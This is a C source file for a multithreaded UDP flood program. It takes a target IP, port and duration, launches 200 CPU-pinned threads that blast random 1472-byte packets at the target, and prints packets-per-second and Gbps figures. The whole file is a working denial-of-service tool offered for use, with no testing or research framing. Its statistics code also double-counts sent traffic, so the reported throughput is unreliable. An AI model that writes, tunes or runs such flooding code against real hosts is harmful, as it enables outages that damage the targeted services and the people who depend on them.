#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <sys/time.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sched.h>

#define BUFFER_SIZE 1472
#define MAX_THREADS 200
#define BATCH_SIZE 1000
#define STATS_INTERVAL 1

typedef struct {
    char ip[16];
    int port;
    int duration;
    int thread_id;
    int cpu_core;
    long packet_count;
    long total_bytes;
} flood_args_t;

volatile sig_atomic_t keep_running = 1;
volatile long global_packets = 0;
volatile long global_bytes = 0;
time_t global_start_time;

typedef struct {
    char data[BUFFER_SIZE];
} __attribute__((aligned(64))) packet_buffer_t;

void handle_signal(int sig) {
    keep_running = 0;
    printf("\nShutting down gracefully...\n");
}

void set_cpu_affinity(int cpu_core) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu_core, &cpuset);
    pthread_t current_thread = pthread_self();
    pthread_setaffinity_np(current_thread, sizeof(cpu_set_t), &cpuset);
}

inline long long get_time_ns() {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long long)ts.tv_sec * 1000000000LL + ts.tv_nsec;
}

void *stats_thread(void *arg) {
    set_cpu_affinity(0);
    time_t last_time = time(NULL);
    long last_packets = 0;
    long last_bytes = 0;
    
    while (keep_running) {
        sleep(STATS_INTERVAL);
        time_t current_time = time(NULL);
        long current_packets = __sync_fetch_and_add(&global_packets, 0);
        long current_bytes = __sync_fetch_and_add(&global_bytes, 0);
        long interval_packets = current_packets - last_packets;
        long interval_bytes = current_bytes - last_bytes;
        double interval_seconds = difftime(current_time, last_time);
        
        if (interval_seconds > 0) {
            double pps = interval_packets / interval_seconds;
            double gbps = (interval_bytes * 8.0) / (interval_seconds * 1000000000);
            double total_gb = (double)current_bytes / (1000000000);
            printf("[STATS] PPS: %.0f | Gbps: %.2f | Total: %.2f GB | Time: %lds\n", 
                   pps, gbps, total_gb, (current_time - global_start_time));
        }
        
        last_packets = current_packets;
        last_bytes = current_bytes;
        last_time = current_time;
    }
    return NULL;
}

void *udp_flood(void *args) {
    flood_args_t *flood_args = (flood_args_t *)args;
    const char *ip = flood_args->ip;
    int port = flood_args->port;
    int duration = flood_args->duration;
    int thread_id = flood_args->thread_id;
    int cpu_core = flood_args->cpu_core;
    
    set_cpu_affinity(cpu_core);
    
    int sock;
    struct sockaddr_in target;
    socklen_t target_len = sizeof(target);

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        free(args);
        return NULL;
    }

    int sock_opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &sock_opt, sizeof(sock_opt));
    int sendbuf = 64 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
    
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target.sin_addr) <= 0) {
        perror("Invalid address");
        close(sock);
        free(args);
        return NULL;
    }

    packet_buffer_t *buffers = malloc(BATCH_SIZE * sizeof(packet_buffer_t));
    if (!buffers) {
        perror("Buffer allocation failed");
        close(sock);
        free(args);
        return NULL;
    }
    
    mlock(buffers, BATCH_SIZE * sizeof(packet_buffer_t));
    
    FILE *urandom = fopen("/dev/urandom", "rb");
    if (urandom) {
        for (int i = 0; i < BATCH_SIZE; i++) {
            size_t bytes_read = fread(buffers[i].data, 1, BUFFER_SIZE, urandom);
            if (bytes_read != BUFFER_SIZE) {
                for (int j = bytes_read; j < BUFFER_SIZE; j++) {
                    buffers[i].data[j] = (char)(rand() % 256);
                }
            }
        }
        fclose(urandom);
    } else {
        srand(time(NULL) + thread_id);
        for (int i = 0; i < BATCH_SIZE; i++) {
            for (int j = 0; j < BUFFER_SIZE; j++) {
                buffers[i].data[j] = (char)(rand() % 256);
            }
        }
    }

    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;
    long thread_packets = 0;
    long thread_bytes = 0;
    int buffer_index = 0;
    
    printf("Thread %d (CPU %d) started - Target: %s:%d\n", 
           thread_id, cpu_core, ip, port);
    
    while (keep_running && time(NULL) < end_time) {
        for (int i = 0; i < BATCH_SIZE; i++) {
            ssize_t sent = sendto(sock, buffers[buffer_index].data, BUFFER_SIZE, 
                                 MSG_DONTWAIT, (struct sockaddr *)&target, target_len);
            if (sent > 0) {
                thread_packets++;
                thread_bytes += sent;
                buffer_index = (buffer_index + 1) % BATCH_SIZE;
            }
        }
        __sync_fetch_and_add(&global_packets, thread_packets);
        __sync_fetch_and_add(&global_bytes, thread_bytes);
    }

    free(buffers);
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
        return 1;
    }

    signal(SIGINT, handle_signal);
    global_start_time = time(NULL);

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    pthread_t threads[MAX_THREADS];
    pthread_t stats_tid;

    pthread_create(&stats_tid, NULL, stats_thread, NULL);

    for (int i = 0; i < MAX_THREADS; i++) {
        flood_args_t *args = malloc(sizeof(flood_args_t));
        strcpy(args->ip, ip);
        args->port = port;
        args->duration = duration;
        args->thread_id = i;
        args->cpu_core = i % sysconf(_SC_NPROCESSORS_ONLN);
        pthread_create(&threads[i], NULL, udp_flood, args);
        usleep(10000);
    }

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    keep_running = 0;
    pthread_join(stats_tid, NULL);
    printf("All threads finished.\n");
    return 0;
}
